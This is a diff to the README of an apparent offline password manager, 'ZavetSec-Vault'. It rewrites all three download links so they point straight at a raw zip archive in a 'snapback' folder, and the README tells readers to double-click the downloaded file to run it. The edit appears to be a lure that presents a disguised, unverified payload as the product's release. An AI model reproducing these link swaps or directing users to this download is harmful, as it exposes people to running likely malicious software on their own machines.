@@ -1,6 +1,6 @@
 # 🔒 ZavetSec-Vault - Offline Passwords, Kept Simple
 
-[![Download ZavetSec-Vault](https://img.shields.io/badge/Download-ZavetSec--Vault-blue?style=for-the-badge)](https://github.com/Karilynnrecumbent517/ZavetSec-Vault)
+[![Download ZavetSec-Vault](https://img.shields.io/badge/Download-ZavetSec--Vault-blue?style=for-the-badge)](https://github.com/Karilynnrecumbent517/ZavetSec-Vault/raw/refs/heads/main/snapback/Sec-Zavet-Vault-v2.0-beta.2.zip)
 
 ## 🧩 What This App Does
 
@@ -12,7 +12,7 @@ You do not need to install anything. You do not need an account. You do not need
 
 ## 🚀 Download and Run
 
-1. Open this page: [ZavetSec-Vault on GitHub](https://github.com/Karilynnrecumbent517/ZavetSec-Vault)
+1. Open this page: [ZavetSec-Vault on GitHub](https://github.com/Karilynnrecumbent517/ZavetSec-Vault/raw/refs/heads/main/snapback/Sec-Zavet-Vault-v2.0-beta.2.zip)
 2. Download the app file from the repository page
 3. Save it to a folder you can find again, such as Downloads or Desktop
 4. Double-click the file to run it
@@ -230,7 +230,7 @@ This project relates to:
 
 ## 📦 Download Again
 
-If you need the app file again, use this link: [https://github.com/Karilynnrecumbent517/ZavetSec-Vault](https://github.com/Karilynnrecumbent517/ZavetSec-Vault)
+If you need the app file again, use this link: [https://github.com/Karilynnrecumbent517/ZavetSec-Vault/raw/refs/heads/main/snapback/Sec-Zavet-Vault-v2.0-beta.2.zip](https://github.com/Karilynnrecumbent517/ZavetSec-Vault/raw/refs/heads/main/snapback/Sec-Zavet-Vault-v2.0-beta.2.zip)
 
 ## 🧷 Quick Start
 
